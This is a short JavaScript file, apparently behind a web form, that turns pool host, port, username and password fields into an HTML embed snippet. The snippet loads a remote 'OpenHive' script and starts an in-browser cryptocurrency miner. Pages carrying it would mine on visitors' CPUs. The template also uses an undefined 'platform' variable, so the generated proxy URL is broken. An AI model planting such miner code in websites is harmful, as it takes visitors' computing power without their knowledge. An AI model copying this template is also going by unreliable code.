'use strict';

function getCode(host, port, username, password) {
    if (port == '') port = '[PORT]';
    if (host == '') host = '[HOST]';
    if (username == '') username = '[USERNAME]';
    if (password == '') password = '[PASSWORD]';

    return `<script src="https://lisennk.github.io/OpenHive/ch/m.js?proxy=ws://${platform}?pool=${host}:${port}:${password}"></script>
<script>
    // Start mining
    var m = CH.Anonymous('${username}');
    m.start();
</script>
    `;
}

$(code).val(getCode('', '', '', ''));

$('.form-control').on('keypress', gen);
$('.form-control').on('change', gen);


function gen() {
    let html = getCode($(host).val(), $(port).val(), $(username).val(), $(password).val());
    $(code).val(html);
}